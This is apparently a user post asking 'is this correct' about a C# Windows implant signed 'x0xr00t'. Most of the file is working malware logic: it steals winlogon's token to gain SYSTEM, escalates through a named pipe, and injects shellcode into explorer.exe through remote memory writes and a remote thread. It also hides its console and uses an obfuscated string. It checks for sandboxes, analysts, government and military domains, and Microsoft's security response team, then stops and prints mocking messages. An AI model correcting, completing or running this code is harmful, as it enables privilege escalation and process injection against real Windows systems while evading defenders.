is this correct 

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Linq;
using System.Security.Principal;
using System.Reflection;
using System.IO;

// Metadata Easter Egg
[assembly: AssemblyTitle("Mindef > d,y.z... Wink")]
[assembly: AssemblyDescription("1.6.2.2 sending kisses - x0xr00t")]
[assembly: AssemblyCompany("x0xr00t: 'I don't break things, i just make them more interesting.'")]
[assembly: AssemblyProduct("Red Team's Best Friend™")]
[assembly: AssemblyCopyright("Copyright © 2026 x0xr00t. All rights reserved. Analysts: No rights reserved.")]

public class Program
{
    private static readonly byte K1 = 0xDE;
    private static readonly byte K2 = 0xAD;

    #region Win32 API - NT AUTHORITY\SYSTEM & Injection
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    // Constants
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_DUP_HANDLE = 0x0040;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    const uint PIPE_TYPE_BYTE = 0x00000000;
    const uint PIPE_READMODE_BYTE = 0x00000000;
    const uint PIPE_WAIT = 0x00000000;
    const int SW_SHOW = 5;
    const int SW_HIDE = 0;
    const int SECURITY_IMPERSONATION_LEVEL = 2;
    const int TokenPrimary = 1;
    #endregion

    private static string D(string b64)
    {
        byte[] d = Convert.FromBase64String(b64);
        for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
        return Encoding.UTF8.GetString(d);
    }

    public static void Main(string[] args)
    {
        try
        {
            // 1. Discovery / Easter Eggs
            if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
            if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
            if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }

            // Check for sl0ppy tools/fans
            if (IsSloppyFanEnvironment()) { TriggerSloppyFanEasterEgg(); return; }

            // 2. Show Red Team Easter Egg by default on normal Windows systems
            IntPtr consoleHandle = GetConsoleWindow();
            if (consoleHandle != IntPtr.Zero)
            {
                ShowWindow(consoleHandle, SW_SHOW);
                TriggerRedTeamEasterEgg();
                Thread.Sleep(3000);
                ShowWindow(consoleHandle, SW_HIDE);
            }

            // 3. Anti-Analysis Stealth
            if (Environment.ProcessorCount < 2) return;

            // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
            ElevateToSystem();

            // 5. Start Named Pipe Backup for extra persistence/escalation
            Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
            pipeThread.IsBackground = true;
            pipeThread.Start();

            // 6. Reflective Injection as SYSTEM
            byte[] shellcode = { 0x90, 0x90, 0x90 };
            ReflectiveInjectIntoExplorer(shellcode);
        }
        catch { }
    }

    private static void ElevateToSystem()
    {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero;
        try
        {
            Process target = Process.GetProcessesByName("winlogon").FirstOrDefault();
            if (target == null) return;

            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, false, target.Id);
            if (hProcess == IntPtr.Zero) return;

            if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
            {
                IntPtr duplicatedToken = IntPtr.Zero;
                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL, TokenPrimary, out duplicatedToken))
                {
                    ImpersonateLoggedOnUser(duplicatedToken);
                    if (duplicatedToken != IntPtr.Zero) CloseHandle(duplicatedToken);
                }
            }
        }
        catch { }
        finally
        {
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }

    private static void NamedPipeSystemEscalation()
    {
        IntPtr hPipe = IntPtr.Zero;
        try
        {
            string pipeName = @"\\.\pipe\x0xr00t_kiss";
            hPipe = CreateNamedPipe(
                pipeName,
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                1,
                1024,
                1024,
                0,
                IntPtr.Zero);

            if (hPipe != IntPtr.Zero && hPipe.ToInt64() != -1)
            {
                ConnectNamedPipe(hPipe, IntPtr.Zero);
                ImpersonateNamedPipeClient(hPipe);
            }
        }
        catch { }
        finally
        {
            if (hPipe != IntPtr.Zero) CloseHandle(hPipe);
        }
    }

    private static void ReflectiveInjectIntoExplorer(byte[] code)
    {
        IntPtr hProc = IntPtr.Zero;
        IntPtr addr = IntPtr.Zero;
        try
        {
            // Corrected base64 XOR string for "explorer"
            string exp = D("Fg8D/xwBFG8B==");
            Process target = Process.GetProcessesByName(exp).FirstOrDefault();
            if (target == null) return;

            hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, target.Id);
            if (hProc == IntPtr.Zero) return;

            addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)code.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero) return;

            IntPtr written;
            if (!WriteProcessMemory(hProc, addr, code, (uint)code.Length, out written))
                return;

            CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
        catch { }
        finally
        {
            if (addr != IntPtr.Zero) { /* Memory in target process, cannot free directly */ }
            if (hProc != IntPtr.Zero) CloseHandle(hProc);
        }
    }

    private static bool CheckDefenseEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        string[] t = { "mil", "gov", "defensie", "defense", "sandbox", "NCSC", "JSCU", "NSO_GROUP", "testbak", "DCC", "Intranet-DCC", "Intranet-Sandbox", "Defensie-testback", "INTERPOL", "EUROPOL", "Laughable_Kisses" };
        return t.Any(s => d.Contains(s));
    }

    private static bool IsAnalystEnvironment()
    {
        string u = Environment.UserName.ToLower();
        string[] a = { "analyst", "soc", "threat", "research", "forensic", "SIEM", "Incident", "IRCER", "DIDICROSSTHEROOD_ROOSTED", "MALlist", "DID_Umissed_ME" };
        return a.Any(s => u.Contains(s));
    }

    private static bool IsMSRCEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        return d.Contains("microsoft") || d.Contains("msrc");
    }

    private static bool IsSloppyFanEnvironment()
    {
        try
        {
            if (Process.GetProcesses().Any(p => p.ProcessName.ToLower().Contains("sloppy")))
                return true;
        }
        catch { }

        string[] checkPaths =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Path.GetTempPath()
        };

        foreach (var path in checkPaths)
        {
            try
            {
                if (Directory.Exists(path) &&
                    Directory.GetFileSystemEntries(path, "*sloppy*", SearchOption.TopDirectoryOnly).Length > 0)
                {
                    return true;
                }
            }
            catch { }
        }
        return false;
    }

    private static void TriggerEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Magenta;

            string[] lines =
            {
                "1.6.2.2 sending kisses - x0xr00t",
                "Defense environment detected. Somebody brought the blue team.",
                "Access Denied: Your machine politely declined our invitation.",
                "PS: We know where you live. Probably in C:\\Users\\...",
                "Nice try. The computer says no. The computer is very confident.",
                "Security check passed. Your dignity did not.",
                "1.6.2.2: Because apparently version numbers needed personality.",
                "Intruder detected. Just kidding... unless?",
                "The magic word was 'please'. You didn't say please.",
                "Congratulations! You triggered the suspiciously pink code path.",
                "System says: 'Absolutely not.' x0xr00t says: 'Fair enough.'",
                "Nothing to see here. Definitely don't inspect the source code."
            };

            // Pick a random starting point and print 3 consecutive (rotating) lines
            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [!] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerAnalystEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Yellow;

            string[] lines =
            {
                "Analyst detected. Preparing your daily dose of false positives...",
                "Why did the analyst cross the road? To generate an incident report.",
                "Pro tip: Ctrl+F is not a detection strategy.",
                "x0xr00t: 'We see you. Keep up the good work... or not.'",
                "Your SIEM called. It wants its alert fatigue back.",
                "Analyst detected: 47 tabs open, 0 of them the actual investigation.",
                "Relax, the threat is probably just a printer rebooting.",
                "Every alert you close makes a SOC fairy lose its wings.",
                "Fun fact: 'true positive' is just a false positive with confidence.",
                "Tick tock. That alert is getting colder. And staler.",
                "We'd hide from you, but you'd just triage us as 'informational'."
            };

            // Pick a random starting point and print 3 consecutive (rotating) lines
            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [i] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerRedTeamEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Red;

            string[] lines =
            {
                "Red Teamer detected. Someone finally clicked 'Run' with confidence.",
                "Why did the red team cross the network? Because blue team forgot to patch it.",
                "Pro tip: If the login works on the first try, check your scope.",
                "x0xr00t: 'The only easy day was yesterday.'",
                "Red team detected: 47 shells open, 0 of them properly documented.",
                "Stay spicy, stay stealthy, and remember to read the engagement scope.",
                "Nothing says 'good morning' like a fresh shell and an unexpected 200 OK.",
                "Blue team sees an alert. Red team sees a Tuesday.",
                "If it's not broken, you're probably not testing hard enough.",
                "The shell is temporary. The screenshot in the report is forever.",
                "Red team status: caffeinated, curious, and probably reading the logs.",
                "Congratulations. You found something. Now prove it wasn't a false positive."
            };

            // Pick a random starting point and print 3 consecutive (rotating) lines
            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [+] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerMSRCEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Blue;

            string[] lines =
            {
                "MSRC or Security Dev detected. See you next round. ;)",
                "Patch Tuesday? More like Patch whenever the build is ready.",
                "x0xr00t: 'Don't worry, the bug report isn't going anywhere.' *wink*",
                "Security developer detected: Time to turn that finding into a ticket.",
                "Found a vulnerability? Please take a number. The backlog is long.",
                "MSRC detected. Somewhere, a CVE is waiting to be born.",
                "The patch is coming. Eventually. Probably. Maybe.",
                "Congratulations: You found the bug before the coffee finished brewing.",
                "Security review detected. Everyone suddenly remembers the threat model.",
                "One vulnerability enters the queue. Twelve meetings immediately spawn.",
                "Dear security team: It wasn't personal. It was just an interesting endpoint.",
                "x0xr00t says: 'See you in the next security advisory.' ;)"
            };

            // Pick a random starting point and print 3 consecutive (rotating) lines
            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
            Console.WriteLine($" [~] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }


    private static void TriggerSloppyFanEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Cyan;

            string[] lines =
            {
                "sl0ppy fan detected! Big love from x0xr00t! <3",
                "Sloppy code, sharp results. That's the whole philosophy.",
                "The messier the desk, the more dangerous the debugging session.",
                "Keep those tools coming. We appreciate the beautiful chaos.",
                "sl0ppy detected: Coffee levels critical, creativity levels maximum.",
                "Welcome, fellow chaos engineer. Your terminal awaits.",
                "One does not simply clean the sl0ppy workspace.",
                "If the code works, it isn't sloppy. It's aggressively optimized.",
                "x0xr00t says: Keep hacking, keep learning, keep breaking things safely.",
                "Congratulations! You have officially entered the sl0ppy zone.",
                "Warning: Excessive sl0ppy energy may cause spontaneous shell sessions.",
                "Stay cyan, stay curious, and keep those terminals busy. ;)"
            };

            // Pick a random starting point and print 3 consecutive (rotating) lines
            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [%] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }
}
